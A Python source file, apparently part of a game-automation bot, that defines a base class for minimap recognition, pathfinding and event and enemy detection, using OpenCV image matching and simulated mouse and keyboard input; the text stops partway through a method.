"""寰宇命途内核的公共基类：地图识别、寻路、事件与祝福交互。"""

import ctypes
import hashlib as _h
import json
import os
import random
import time
from copy import deepcopy
from math import atan2, pi

import cv2 as cv
import numpy as np
import pyautogui
import win32api
import win32con

from core.any_fate.text_key import FATES, text_keys
from core.common.runtime import ScriptKernel, set_forground, sprint
from route import PATHS
from tool import GLOBAL
from tool.calibration import get_multi
from tool.GLOBAL import factor, key_mouse_manager
from tool.log import CUS_LOGGER
from tool.mask import MASK
from tool.settings import load_settings
from tool.thread import ThreadWithException
from tool.utils.Error import NormalEndError
from tool.utils.image_tool import find_image_by_name, find_image_in_folder
from tool.utils.minimap_util import (
    MINIMAP_RADIUS,
    POSITION_MINIMAP_SCALE,
    POSITION_SEARCH_SCALE,
    crop,
    deal_minimap,
    get_minimap,
    mask_minimap_outside,
    re_get_position,
)
from tool.utils.mminimap import PositionPredict
from tool.utils.ocr_num import match_skill_numbers_in_region
from tool.utils.predict import get_text_position, predict
from tool.utils.tool import get_dis, get_hwnd_and_text


class FateUtils(ScriptKernel):
    """寰宇命途内核的公共基类。

    负责地图识别、寻路、事件与祝福交互；命途与录像等差异留给子类。
    """

    # count.txt 中本内核占用的行号：ironblood第 1 行、fingersnap第 2 行、anyfate第 3 行
    # 同一文件按行区分各内核的累计运行次数，互不覆盖
    count_line = 2

    def __init__(self, *, fate=None, debug=False, max_run_time=0):
        # 先把游戏窗口切到前台，否则 ScriptKernel 等窗口时焦点可能仍停在别处
        set_forground()
        # 自动化会把鼠标频繁移到屏幕角落；pyautogui 的 fail-safe 会据此抛异常并终止键鼠线程
        pyautogui.FAILSAFE = False
        super().__init__()
        self.debug = 1 if debug else 0
        self.max_run_time = max_run_time
        self.fate = fate or FATES[4]
        self.my_fate = FATES.index(self.fate)
        self.tk = text_keys(self.my_fate)
        self.multi = get_multi()
        # ScriptKernel 初始化时把按键倍率重置为 1，这里按校准结果重新注入
        key_mouse_manager.set_config(self)
        # 任务开始输出窗口 DPI 缩放与校准倍率，转身速度异常时可据此判断是 DPI 还是校准值的问题
        try:
            dpi_scale = ctypes.windll.user32.GetDpiForWindow(self.hwnd) / 96.0 if self.hwnd else 1.0
        except Exception:
            dpi_scale = 1.0
        CUS_LOGGER.debug("DPI: " + str(dpi_scale) + " A:" + str(int(self.multi * 100) / 100))
        GLOBAL.DEBUG_MODE = bool(self.debug)
        # 调试时额外开启地图窗口
        self._show_map = bool(self.debug)
        # 层数是否变动
        self.floor_change = False
        self.ang = 270
        # 无地图模式下进图时的初始角度
        self.initial_angle = None
        # 当前计算坐标
        self.now_loc = [0, 0]
        # 小地图连续识别失败次数，达到阈值后缓存坐标不可信
        self.minimap_fail_count = 0
        # 裁剪大地图范围
        self.cut_pos = None
        # 0 初始 1 寻路中 3 接近目标点 >=7 完成一轮寻路
        self.mini_state = 0
        self.target = set()
        self.stop_move = 0
        self.first_mini = 1
        self.target_type = -1
        self.allow_e = 1
        self.quan = 0
        self.bai_e = 0
        self.img_map = dict()
        self.should_update_map = True
        self.big_map = None
        self.big_map_init = False
        self.start_pos = (0, 0)
        # 地图标注图相对整张地图图片的偏移；调试窗口在首次匹配到地图前也会读它
        self.upx = self.upy = 0
        # 红色阈值，避免误识别无限循环，识别到后会不断减少
        self.red_threshold = 4500
        # 特殊地图的人工红点无需依赖小地图上的实时敌人红环校验
        self.trust_annotated_attack_targets = False
        # 是否有更新地图线程
        self.has_update = False
        # 调试显示用地图
        self.debug_map = None
        # 目标坐标
        self.target_loc = None
        # 地图集合
        self.img_set = []
        self.skill_num = 5
        # 上次交互时间
        self.quit = 0
        # 用于存储 tmp 地图
        self.pos_map = None
        # 当前层数
        self.floor = -1
        # 最佳匹配地图编号
        self.now_map = None
        # 最佳匹配地图相似度
        self.now_map_sim = None
        # 是否找到可用地图；map_data_load 每轮会重写，这里给初值避免首轮读不到
        self.find = 1
        # 显示地图的调试线程，未开启调试窗口时不存在
        self.map_thread = None
        # 位置预测
        self.pos_predictor = PositionPredict()
        # 本轮迭代计数与开始时间，仅用于结算日志
        self.my_cnt = 0
        self.init_time = time.time()
        self.count = 0
        # 本局是否因异常终止：异常终止的录像默认保留，便于排查
        self.keep_video_for_error = False
        self.load_img_map()
        self.update_count()
        self.CrTU5s61E1dMnT()
        CUS_LOGGER.debug(f"开始运行,初始计数：{self.count}")

    def load_img_map(self):
        """把全部已标注地图的初始小地图载入内存，寻路时用于匹配当前所在地图。"""
        map_root = os.path.join(PATHS["image"], "nmaps")
        if not os.path.isdir(map_root):
            return
        for file in os.listdir(map_root):
            init_path = os.path.join(map_root, file, "init.jpg")
            if not os.path.exists(init_path):
                continue
            image = cv.imread(init_path)
            if image is None:
                continue
            image = deal_minimap(image, is_minimap=True)
            self.img_map[file] = cv.resize(
                image, None, fx=0.5, fy=0.5, interpolation=cv.INTER_CUBIC
            )
        CUS_LOGGER.debug(f"加载地图完成，共 {len(self.img_map)} 张")

    def update_count(self, read=True):
        """读取或递增本内核在 count.txt 中占用的那一行计数。"""
        file_name = os.path.join(PATHS["backup"], "count.txt")
        line_count = self.count_line + 1
        if read:
            new_cnt = 0
            if os.path.exists(file_name):
                with open(file_name, encoding="utf-8", errors="ignore") as fh:
                    lines = fh.readlines()
                    if len(lines) > self.count_line:
                        try:
                            new_cnt = int(lines[self.count_line].strip())
                        except Exception:
                            pass
            else:
                os.makedirs(PATHS["backup"], exist_ok=True)
                with open(file_name, "w", encoding="utf-8") as file:
                    file.write("0\n" * line_count)
            self.count = new_cnt
        else:
            new_cnt = self.count + 1
            lines = ["0\n"] * line_count
            if os.path.exists(file_name):
                with open(file_name, encoding="utf-8", errors="ignore") as fh:
                    lines = fh.readlines()
                while len(lines) < line_count:
                    lines.append("0\n")
            lines[self.count_line] = str(new_cnt) + "\n"
            try:
                with open(file_name, "w", encoding="utf-8") as file:
                    file.writelines(lines)
                self.count = new_cnt
            except Exception as e:
                CUS_LOGGER.error(f"写入运行计数失败 {e}")


    # example: self.wait_fig(lambda:self.check("strange",112,56), 1.4)


    def get_end_point(self, mask=0,device=0):
        self.get_screen()
        local_screen = self.get_local(964, 400, (715, 1399))
        white = np.array([255, 255, 255])
        black = np.array([0, 0, 0])
        bw_map = np.zeros(local_screen.shape[:2], dtype=np.uint8)
        b_map = deepcopy(bw_map)
        b_map[np.sum((local_screen - black) ** 2, axis=-1) <= 1600] = 255
        w_map = deepcopy(bw_map)
        w_map[np.sum((local_screen - white) ** 2, axis=-1) <= 1600] = 255
        kernel = np.zeros((7, 7), np.uint8)  # 设置kenenel大小
        kernel += 1
        b_map = cv.dilate(b_map, kernel, iterations=1)  # 膨胀还原图形
        bw_map[(b_map > 200) & (w_map > 200)] = 255
        cen = 660
        if mask:
            try:
                #仅保留图像x轴310~910区域
                bw_map[:, : cen - 350 // mask] = 0
                bw_map[:, cen + 350 // mask :] = 0
            except Exception:
                pass
        # region = cv.imread("resource/imgs/region.jpg", cv.IMREAD_GRAYSCALE)
        if device:
            region = find_image_in_folder('gray_image/', 'device.png')
        else:
            region=find_image_in_folder('gray_image/', 'region.jpg')
        result = cv.matchTemplate(bw_map, region, cv.TM_CCORR_NORMED)
        min_val, max_val, min_loc, max_loc = cv.minMaxLoc(result)
        if max_val < 0.6:
            return None
        else:
            #正数位于中心点660右侧，负数位于中心点660左侧
            dx = max_loc[0] - cen
            if dx > 0:
                return dx**0.7
            else:
                return -((-dx) ** 0.7)

    def move_to_end(self, i=0,mode=0,device=0):
        CUS_LOGGER.debug(f"一人前往未来……一人留在过去。(类型{mode})")
        dx = self.get_end_point(i,device)
        if dx is None:
            if i:
                CUS_LOGGER.warning("而我将行尽未竟的道路…一如过去无数个我，一如既往。")
                return 0
            win32api.mouse_event(win32con.MOUSEEVENTF_MOVE, 0, -200)
            dx = self.get_end_point(device=device)
            off = 0
            if dx is None:
                CUS_LOGGER.debug('…找到那个新生的「我」…让他延续三千万世的徒劳。')
                for k in [60,120,60,60,30,30,-60,-60,-60,-60,-60,-60]:
                    key_mouse_manager.turn(-k)
                    key_mouse_manager.wait()
                    off += k
                    dx = self.get_end_point(device=device)
                    if dx is not None:
                        break
                if dx is None:
                    key_mouse_manager.turn(off*1.03)
                    key_mouse_manager.wait()
                    CUS_LOGGER.debug("旋转未找到终点")
                    CUS_LOGGER.warning(f"即便理智随身形一起化作焦炭，{factor}也会记得自己的使命……")
                    return 0
        CUS_LOGGER.debug(f"移动面向终点 参数{i}移动距离{dx}")
        if i == 0:
            key_mouse_manager.turn(dx / 3)
            key_mouse_manager.wait()
        else:
            key_mouse_manager.turn(dx / 5)
            key_mouse_manager.wait()
        if i == 0 and abs(dx / 3) > 30:
            dx = self.get_end_point(1,device=device)
            if dx is not None:
                key_mouse_manager.turn(dx / 4)
                key_mouse_manager.wait()
        return 1


    def get_blank_state(self, save_debug_dir=None):
        local_screen = get_minimap(self.screen, radius=MINIMAP_RADIUS, copy=True, rotation=True, center_radius=90)
        #作用是筛选掉蓝色，但会意外筛去一些颜色
        # local_screen = local_screen - cv.bitwise_and(local_screen, local_screen,mask=cv.inRange(cv.cvtColor(local_screen, cv.COLOR_BGR2HSV),np.array([80, 0, 0]), np.array([110, 255, 255])))
        bw_map = np.zeros(local_screen.shape[:2], dtype=np.uint8)
        grey_map = deepcopy(bw_map)
        grey_map[np.sum((local_screen - np.array([55, 55, 55])) ** 2, axis=-1) <= 4800] = 255
        grey_map = cv.dilate(grey_map, np.ones((5, 5), np.uint8), iterations=1)
        bw_map[(np.sum((local_screen - np.array([210, 210, 210])) ** 2, axis=-1) <= 9000) & (grey_map > 200)] = 255
        non_black_pixels = np.count_nonzero(bw_map)
        CUS_LOGGER.debug(f"非黑像素点数量：{non_black_pixels}")

        # 保存调试图像，用于判断阈值是否合适
        if save_debug_dir and non_black_pixels < 250:
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            tag = f"blank_{non_black_pixels}_{timestamp}"
            save_debug_dir=os.path.join(save_debug_dir, f"{tag}")
            os.makedirs(save_debug_dir, exist_ok=True)
            cv.imwrite(os.path.join(save_debug_dir, "minimap.png"), local_screen)
            cv.imwrite(os.path.join(save_debug_dir, "bwmap.png"), bw_map)
            cv.imwrite(os.path.join(save_debug_dir, "greymap.png"), grey_map)
            with open(os.path.join(save_debug_dir, "params.txt"), "w", encoding="utf-8") as fp:
                fp.write(f"non_black_pixels = {non_black_pixels}\n")
                fp.write("threshold = 250\n")
                fp.write("verdict = reference_lines_too_few (参考线太少，进入无地图寻路)\n")
                fp.write("grey_threshold = np.array([55, 55, 55]), dist <= 4800\n")
                fp.write("white_threshold = np.array([210, 210, 210]), dist <= 9000\n")
                fp.write("dilate_kernel = 5x5, iterations=1\n")

        return non_black_pixels


    def good_f(self,run=True):
        """
        不是"沉浸", "紧锁", "复活", "下载"的交互
        """
        CUS_LOGGER.info("请求：「开启再创世，去迎接翁法罗斯崭新的黎明。」")
        t_start=time.time()
        img = self.get_small_interaction_img(MASK["interact_text_3"])
        text = self.ts.similar_list(self.tk.interacts, img)
        if text is None:
            # 使用新坐标重新尝试
            img = self.get_small_interaction_img(MASK["interact_text"])
            text = self.ts.similar_list(self.tk.interacts, img)
        is_killed = text in ["沉浸", "紧锁", "复活", "下载"]
        if text is not None:
            CUS_LOGGER.info(f'响应：「一▇▇▇▇徒劳的▇▇▇{text}▇▇▇。」')
        CUS_LOGGER.debug(f"交互最佳结果判断{text is not None and not is_killed}")
        if not (text is not None and not is_killed) and run:
            key_mouse_manager.keyDown("move_w")
            key_mouse_manager.wait()
        t_end=time.time()
        return text is not None and not is_killed, t_end-t_start

    def get_recent_target(self):
        """
        寻找最近的目标点位与类型
        """
        mn_dis = 100000
        recent_loc = 0
        recent_type = -1
        # log.info(f"当前状态{self.target}")
        for target_loc, target_type in self.target:
            # log.info(f"遍历当前状态{self.target}")
            dis=get_dis(target_loc, self.now_loc)
            if dis < mn_dis:
                mn_dis = dis
                recent_loc = target_loc
                recent_type = target_type
        # 如果找不到，将最后一个完成的目标点作为目标点
        if recent_loc == 0:
            recent_loc = self.last
            recent_type = 3
        if (recent_type == 1 and mn_dis < 40
                and not self.trust_annotated_attack_targets):
            red = [47, 47, 232]
            # self.save_screen(not_now=True)
            rd = np.where(np.sum((get_minimap(self.screen, radius=MINIMAP_RADIUS,copy=True,rotation=True) - red) ** 2, axis=-1) <= self.red_threshold)
            if rd[0].shape[0] > 0:
                self.target.remove((recent_loc, 1))
                new_loc = re_get_position(self.now_loc)
                CUS_LOGGER.debug(f"移除目标{recent_loc},当前状态{self.target},距离{mn_dis},图片全局坐标{new_loc}")
                # 创建所有检测到的敌人坐标的列表
                enemy_coords = []
                for i in range(len(rd[0])):
                    enemy_x, enemy_y = rd[1][i], rd[0][i]
                    world_x = new_loc[0] + (enemy_x - 93)*POSITION_MINIMAP_SCALE
                    world_y = new_loc[1] + (enemy_y - 93)*POSITION_MINIMAP_SCALE
                    new_loc = re_get_position((world_x, world_y), re=True)
                    enemy_coords.append((new_loc, (enemy_x, enemy_y)))

                # 按距离self.real_loc排序，最近的在前面
                enemy_coords.sort(key=lambda coord: get_dis(coord[0], self.now_loc))
                # 选择最近的敌人作为目标
                nearest_world_coord, nearest_local_coord = enemy_coords[0]
                recent_loc = tuple(nearest_world_coord)
                self.target.add((recent_loc, 1))
                CUS_LOGGER.debug(f"找到新的敌对目标点：{recent_loc}，本地图像坐标{nearest_local_coord }共检测到{len(enemy_coords)}个敌人，按距离排序,最近距离(浮点）{get_dis(recent_loc, self.now_loc)}")
            else:
                self.target.remove((recent_loc, 1))
                self.target.add((recent_loc, 0))
                CUS_LOGGER.info(f"……怒火……在溢出……（使用当前目标作为路径点位：{recent_loc}）")
                recent_type=0
        return recent_loc, recent_type

    def move_to_red_point(self):
        self.get_screen()
        if not self.is_run():
            return False
        CUS_LOGGER.info("终于，还是……看来，避免刀剑交锋，果真是天方夜谭。")
        local_screen = get_minimap(self.screen, radius=MINIMAP_RADIUS, copy=True, rotation=True,center_radius=90)
        # 找红色点位（敌人）
        rd = np.where(np.sum((local_screen - [47, 47, 232]) ** 2, axis=-1) <= 5000)
        CUS_LOGGER.debug(f"敌人检测结果{rd[0].shape[0]}")
        if rd[0].shape[0] > 0:
            # 仅检测存在性，不需要排序，使用第一个检测到的点
            target = ((rd[1][0], rd[0][0]), 3)
            CUS_LOGGER.debug(f"交互点类型{target[1]}，位置{target[0][0]},{target[0][1]}")
            self.target_type = target[1]
            self.has_target = True
            self.update_direction_data(mode=2, target=target)
            return True
        else:
            return False
    def move_to_event(self,threshold = 0.85,rest=False):
        self.get_screen()
        if not self.is_run():
            return False
        CUS_LOGGER.info(f"{factor}总是会如此下定决心。")
        local_screen = get_minimap(self.screen, radius=MINIMAP_RADIUS,copy=True,rotation=True,center_radius=90)
        if not rest:
            icon = find_image_by_name("mini_event")
        else:
            icon =find_image_by_name("mini_rest")
        best_val=-1
        best_scale=-1
        for scale in [1.00, 1.05, 1.10, 1.15, 1.20, 1.25]:
            mini_icon=cv.resize(icon, None, fx=scale, fy=scale, interpolation=cv.INTER_CUBIC)
            sp = mini_icon.shape
            #小地图查找交互点并获取其位置
            result = cv.matchTemplate(local_screen, mini_icon, cv.TM_CCORR_NORMED)
            min_val, max_val, min_loc, max_loc = cv.minMaxLoc(result)
            if max_val>best_val:
                best_val=max_val
                nearest = (max_loc[0] + sp[1] // 2, max_loc[1] + sp[0] // 2)
                target = (nearest, 1)
                best_scale =scale
        if best_val > threshold:
            CUS_LOGGER.debug(f"交互点最佳相似度{best_val}，位置{nearest},比例{best_scale}")
            self.target_type = 1 if not rest else 2
            self.has_target=True
            self.update_direction_data(mode=2,target=target)
            return True
        else:
            return False
    def move_to_shop(self,threshold = 0.925):
        self.get_screen()
        if not self.is_run():
            return False
        CUS_LOGGER.info(f"暴烈的火焰随时都能将{factor}的身躯崩裂，吞噬这个世界，这座可悲的囚笼…")
        local_screen = get_minimap(self.screen, radius=MINIMAP_RADIUS,copy=True,rotation=True,center_radius=90)
        icon =find_image_by_name("mini_shop")
        best_val=-1
        best_scale=-1
        best_points = []
        for scale in [1.00, 1.05, 1.10, 1.15, 1.20, 1.25]:
            mini_icon=cv.resize(icon, None, fx=scale, fy=scale, interpolation=cv.INTER_CUBIC)
            sp = [14*scale,14*scale]
            #小地图查找交互点并获取其位置
            result = cv.matchTemplate(local_screen, mini_icon, cv.TM_CCORR_NORMED)
            min_val, max_val, min_loc, max_loc = cv.minMaxLoc(result)
            # 如果当前缩放的最佳值优于之前记录的最佳值，更新最佳缩放并重新收集点位
            if max_val > best_val:
                best_val = max_val
                best_scale = scale
                if max_val > threshold:
                    loc = np.where(result > threshold)
                    all_points = []
                    for pt in zip(*loc[::-1]):
                        point = (pt[0] + sp[1], pt[1] + sp[0])
                        all_points.append(point)
                    best_points = all_points

        # 从最佳点位中选择最左边的一个（x 坐标最小）
        if best_val > threshold and len(best_points) > 0:
            best_points.sort(key=lambda p: p[0])
            nearest = best_points[0]
            target = (nearest, 1)
            CUS_LOGGER.debug(f"交互点最佳相似度{best_val}，位置{nearest},比例{best_scale},候选点位{len(best_points)}")
            self.target_type = 2
            self.has_target=True
            self.update_direction_data(mode=2,target=target)
            return True
        else:
            return False

    def move_direct_thread(self,device=0,initial_angle=None):
        CUS_LOGGER.info("「去成为翁法罗斯的黎明吧......」")
        self.is_find_end = 0
        if self.mini_state > 2:
            CUS_LOGGER.info("直到另一轮太阳在遥远的地平升起，为翁法罗斯带来真正的黎明。")
            self.is_find_end = self.move_to_end(mode=2,device=device)
            self.has_target=bool(self.is_find_end)
            if self.has_target:
                self.target_type=4
        else:
            self.has_target=self.move_direct_to_text()
            if self.has_target:
                self.target_type=1
        if not self.has_target:
            self.restore_initial_angle(initial_angle)
        self.ready = 1
        now_time = time.time()
        if self.is_find_end == 0:
            self.is_find_end = 0.5
        while not self.stop_move and time.time() - now_time < 3:
            if self.moving_direct:
                continue
            if self.mini_state > 2:
                self.is_find_end = max(self.move_to_end(self.is_find_end,mode=3,device=device), self.is_find_end)
                if self.is_find_end!=0.5 and self.is_find_end!=0:
                    self.has_target=True
                    self.target_type=4
        CUS_LOGGER.info(f"无需再去追逐什么，如今，{factor}已是长夜尽头的烈火……")

    def restore_initial_angle(self, initial_angle):
        if initial_angle is None:
            return
        current_angle, direction = self.pos_predictor.update_minimap_data(self.get_screen())
        if direction is None or current_angle is None:
            return
        turn_angle = (initial_angle - current_angle + 180) % 360 - 180
        key_mouse_manager.turn(turn_angle)
        key_mouse_manager.wait()
        _, direction = self.pos_predictor.update_minimap_data(self.get_screen())
        if direction is not None:
            self.ang = (270 + direction) % 360
        CUS_LOGGER.debug(f"未找到有效目标，恢复初始视角{initial_angle}度，旋转{turn_angle}度")

    # 初始化地图，刚进图时调用
    def init_map(self):
        self.big_map=None
        self.big_map_init = False
        self.now_loc = (93,93)
        self.first_mini = 1
        self.find=1
        self.red_threshold = 4500
        self.initial_angle = None
        self.mini_state=1
        # 换图后旧地图上的失败计数不再适用
        self.minimap_fail_count = 0
    def nof(self,must_be=None):
        """
        检查当前没有f交互
        """

        tm = time.time()
        self.update_state("inf")
        ava = False
        if must_be is None and (self.ts.similar("区域") or self.ts.similar("觐见")):
            must_be='tp'
        while not ava and time.time()-tm<1.8:
            if not self.check("interact", mask=MASK["interact_icon"], threshold=0.96,fresh=True):
                if not self.is_run():
                    CUS_LOGGER.info("仿佛连深不见底的最初混沌，也能够烧却。")
                    ava = True
        if self.state=="run":
            if must_be!='challenge':
                key_mouse_manager.press("move_s")
                key_mouse_manager.wait()
                if not self.is_run():
                    CUS_LOGGER.info("…我以为，那就是世间最极致的力量，再无其他。")
                    ava=True
                elif (not self.check("interact", mask=MASK["interact_icon"], threshold=0.96,fresh=True)) and must_be == 'tp':
                    CUS_LOGGER.info("或许只要短短万年的时光——它便会被烧成哀毁骨立的焦炭盗火行者了吧。")
                    ava=True
            else:
                if not self.check("interact", mask=MASK["interact_icon"], threshold=0.96, fresh=True):
                    ava=True

        if ava:
            CUS_LOGGER.info('这一次，逐火的终点………也并无不同。')
            if must_be == 'event':
                self.mini_state += 2
            elif must_be== 'tp':
                if hasattr(self, 'plane_floor'):
                    pass
                else:
                    self.init_map()
                    self.mini_state = 1
                    self.add_floor()
                    if self.floor in [1, 6]:
                        self.last_interact_time = time.time()
                    CUS_LOGGER.debug(f"地图{self.now_map}已完成,相似度{self.now_map_sim},进入{self.floor}层")
            else:
                if self.ts.similar("黑塔"):
                    self.quit = time.time()
                self.mini_state += 2
        else:
            CUS_LOGGER.warning('……那我偏偏，绝不顺从……')
        return ava
    def update_direction_data(self,mode=None,target=None):
        self.rotation, d = self.pos_predictor.update_minimap_data(self.screen)
        if d is None:
            return False
        CUS_LOGGER.debug(f"视角{self.rotation}朝向{d}模式{mode}小地图目标{target}")
        CUS_LOGGER.debug(f"当前点位{self.now_loc}大地图目标点位{self.target_loc}")
        if 20<abs(self.rotation-d)<340:
            key_mouse_manager.wait()
            self.rotation, d = self.pos_predictor.update_minimap_data(self.get_screen())
            if d is None:
                return False
            if 20<abs(self.rotation-d)<340 and mode !=1:
                # cv.imshow("now", self.screen)
                if self.debug:
                    self.save_screen(not_now=True, save_path=os.path.join(PATHS["temp"], "angle"))
                CUS_LOGGER.error(f"角度误差过大视角{self.rotation}朝向{d}模式{mode}")
                # raise BigAngError(f"角度误差过大视角{self.rotation}朝向{d}")
                d = self.rotation
            elif 20<abs(self.rotation-d)<340:
                CUS_LOGGER.debug(f"角度误差过大视角{self.rotation}朝向{d}模式1")
                d=self.rotation
        # 纠正为标准坐标系然后上下反转的坐标系角度（取反估计是为了便于底层操作向左为负，向右为正）
        self.ang = 270 + d
        self.ang%=360
        if mode==2:#小地图寻敌
            rel_loc=(93,93)
            target_loc= target[0]
        else:
            rel_loc=self.now_loc
            target_loc= self.target_loc
        # 当前坐标与目标点连成的直线的斜率
        ang = (
                atan2(target_loc[0] - rel_loc[0], target_loc[1] - rel_loc[1])
                / pi
                * 180
        )
        ang = 90 - ang
        ang%=360
        # 视角需要旋转的角度，规范到[-180,180]
        sub = ang - self.ang
        sub = (sub + 180) % 360 - 180
        if  mode==2 and sub==0:
            sub=1e-9
        key_mouse_manager.turn(sub)
        CUS_LOGGER.debug(f"当前人物角度为：{str(self.ang)}变换后角度{ang},视角移动{sub}")
        # 此处变换为了目标角度
        self.ang = ang
        ds=get_dis(rel_loc, target_loc)
        return ds
    # 寻路函数


    def cut_map(self, pos, map):
        """
        [左上x,左上y,右下x,右下y]
        """
        radius=93
        x,y=map.shape[1],map.shape[0]
        if self.cut_pos is None:
            self.cut_pos=[max(0,pos[0]-radius * POSITION_SEARCH_SCALE), max(0,pos[1]-radius * POSITION_SEARCH_SCALE), min(x,pos[0]+radius * POSITION_SEARCH_SCALE), min(y,pos[1]+radius * POSITION_SEARCH_SCALE)]
        else:
            old_pos=self.cut_pos.copy()
            self.cut_pos=[max(0,min(old_pos[0],pos[0]-radius * POSITION_SEARCH_SCALE)), max(0,min(old_pos[1],pos[1]-radius * POSITION_SEARCH_SCALE)), min(x,max(old_pos[2],pos[0]+radius * POSITION_SEARCH_SCALE)), min(y,max(old_pos[3],pos[1]+radius * POSITION_SEARCH_SCALE))]
        self.cut_pos=np.array(self.cut_pos, dtype=np.float64)
        self.cut_pos= np.round(self.cut_pos).astype(int)
        CUS_LOGGER.debug(f"裁剪地图范围{self.cut_pos}")


    def get_loc(self, fresh=True):
        """
        精确匹配获得精确坐标，该坐标并非代表点位在大地图上的像素坐标，而是经过变换缩放而获得的

        小地图失效（战斗中、黑屏、加载动画）时，位置模板匹配只能得到错误峰值；此时不写入 now_loc，
        否则错误坐标会被后续的位置搜索窗口和转向计算当作真值，战斗结束后也回不到正确位置。

        连续失效 3 次后缓存坐标已不可信，等小地图恢复可用再做整图重定位。
        """

        CUS_LOGGER.debug(f"获取新坐标,当前坐标{self.now_loc}是否刷新{fresh}")
        if fresh:
            self.get_screen()
            if not self.is_run():
                return False
        # 角色朝向箭头是小地图可用的前提：小地图被战斗界面覆盖或整屏黑屏时箭头会消失。
        _, direction = self.pos_predictor.update_minimap_data(self.screen)
        if direction is None:
            # 淡出、弹窗遮挡、震屏通常只持续一两帧，重新截一帧再判断，避免把瞬时遮挡当成小地图失效
            self.get_screen()
            _, direction = self.pos_predictor.update_minimap_data(self.screen)
        if direction is None:
            self.minimap_fail_count += 1
            # 小地图失效也可能只是刚进入/刚离开模拟宇宙大世界，重新确认一次当前是否仍在模拟宇宙中。
            if not self.is_run():
                CUS_LOGGER.warning("小地图识别失败，可能处于其他状态，本次不更新位置")
                return False
            CUS_LOGGER.debug("小地图识别失败，但仍处于模拟宇宙的大世界中，本次不更新位置")
            return True
        # 连续失效 3 次说明缓存坐标已不可信，小地图一恢复就做整图重定位
        if self.minimap_fail_count >= 3:
            # 整图重定位由预测器完成：清空搜索中心做整图匹配，相邻两帧结果互相印证后才写入位置
            pos, gave_up = self.pos_predictor.relocate(self.screen)
            if pos is not None:
                self.now_loc = pos
                self.minimap_fail_count = 0
                CUS_LOGGER.info(f"小地图连续识别失败后整图重定位成功，当前坐标{self.now_loc}")
            elif gave_up:
                # 放弃本次重定位，继续用上次可信坐标，等下一轮连续失败再重来
                self.minimap_fail_count = 0
                CUS_LOGGER.warning("整图重定位连续不一致，放弃本次重定位，继续使用上次可信坐标")
            return True
        pos,sim=self.pos_predictor.update_position(self.screen)
        self.now_loc= pos
        CUS_LOGGER.debug(f"获取到新坐标{self.now_loc}")
        return True


    def write_map(self, map, map_num):
        """
        写入地图
        """
        small_map_set=crop(map, self.cut_pos)
        if self.start_pos[0]==0 and self.start_pos[1]==0:
            self.start_pos=self.now_loc
        CUS_LOGGER.debug(f"地图保存至{self.map_file},起点{self.start_pos}")
        cv.imwrite(
            self.map_file + f"map_{map_num}_({self.start_pos[0]},{self.start_pos[1]}).jpg", small_map_set
        )
        pos=re_get_position(self.start_pos)
        # 将灰度图转换为BGR彩色图以便使用颜色
        map_color = cv.cvtColor(map.copy(), cv.COLOR_GRAY2BGR)
        # 绘制绿色小圆点标记起点
        cv.circle(map_color,
                   tuple(pos),
                   radius=1,
                   color=(0, 255, 0),  # 绿色
                   thickness=-1)
        small_map_set = crop(map_color, self.cut_pos)
        self.debug_map=deepcopy(small_map_set)
        cv.imwrite(self.map_file + f"target_{self.cut_pos[0]}_{self.cut_pos[1]}.jpg", small_map_set)

    # 匹配地图，找到最相似的地图，确定当前房间对应的地图

    def add_floor(self):
        self.floor+=1
        self.floor_change = True
    # @timer
    #0.2~0.25s
    def is_run(self,check=True):
        if check:
            if not self.check("big_world",1801,941, threshold=0.98, fresh=True):
                self.update_state("no_run")
                return False
        # loc_scr = get_minimap(self.screen, radius=MINIMAP_RADIUS,copy=True)
        # hsv = cv.cvtColor(loc_scr, cv.COLOR_BGR2HSV)  # 转HSV
        # lower = np.array([93, 120, 60])  # 90 改成120只剩箭头，但是角色移动过的印记会消失
        # upper = np.array([97, 255, 255])
        # mask = cv.inRange(hsv, lower, upper)  # 创建掩膜
        # sum_blue = np.sum(mask)
        # scr_bak = deepcopy(scr)
        # scr[np.min(scr,axis=-1)<=220]=[0,0,0]
        # scr[np.min(scr,axis=-1)>220]=[255,255,255]
        # res = 40000 < sum_blue < 65000
        # if self.tm>0.96:
        #     res = True
        # self.screen = deepcopy(scr_bak)
        # if res:
        #     self.f_time = 0
        self.update_state("run")
        return True
    def update_debug_map(self):
        self.debug_map = deepcopy(get_minimap(self.get_screen(), radius=MINIMAP_RADIUS))
        if self.pos_map is not None:
            self.pos_map=None
    def auto_update_map(self):
        if self.has_update:
            return
        self.has_update=True
        while self.should_update_map and not self._stop:
            CUS_LOGGER.info(f"{factor}铭记了此刻，铭记了所有无法亲眼目睹世界尽头的友人们与他们的夙愿……")
            self.update_debug_map()
            time.sleep(2)
        self.has_update=False
    def get_event_only_minimap(self):
        """
        self.mini_state 含义
        0: 初始状态
        1: 寻路中状态
        3: 接近目标点状态
        >=7: 完成一轮寻路
        """
        CUS_LOGGER.info(f"{factor}以「负世」之名向你保证……刻法勒永志不忘。")
        self.should_update_map=True
        ThreadWithException(target=self.auto_update_map,name="更新地图").start()
        if self.debug:
            CUS_LOGGER.debug(f'当前状态{self.mini_state}')
        self.stop_move=0
        self.ready=0
        self.is_target = 0
        self.moving_direct=False
        self.has_target=True
        self.is_find_end = 0
        self.get_screen()
        CUS_LOGGER.info(f"{factor}决定穿过那道门扉，去拥抱一个更适合「毁灭」的结局.")
        self.target_type = -1
        if not self.move_to_event():
            CUS_LOGGER.info("相比一团只懂得燃烧的火焰，她一定能在救世的路上走得更远。")
            self.has_target=False
            if self.mini_state > 2:
                CUS_LOGGER.info(f"{factor}也会和曾经的他们一样，带着记忆和火焰…走进新生的混沌。")
                self.is_find_end = self.move_to_end(mode=2,device=1)
                self.has_target = bool(self.is_find_end)
                if self.has_target:
                    self.target_type = 4
            else:
                self.map_data_load(create=False)
                if int(self.now_map)==27793:
                    key_mouse_manager.turn(15)
                else:
                    self.has_target=self.move_direct_to_text()
            CUS_LOGGER.info(f"{factor}需要在此驻足片刻，消化那千万次循环中沉积的悲伤、痛苦和挣扎。")
        else:
            self.has_target=True
            self.target_type = 1
        if not self.check("interact", mask=MASK["interact_icon"], threshold=0.96):
            key_mouse_manager.keyDown("move_w")
        run_wait_time = 2
        self.first_mini = 0
        self.is_sprinting = 0
        if self.has_target:
            run_wait_time+=4
        if self.mini_state==1:
            sprint()
            self.is_sprinting = 1
        need_confirm=0
        init_time = time.time()
        while True:
            key_mouse_manager.wait()
            CUS_LOGGER.info("请求：「救世主，带领吾等前进吧。」")
            if self._stop == 1:
                key_mouse_manager.keyUp("move_w")
                self.stop_move=1
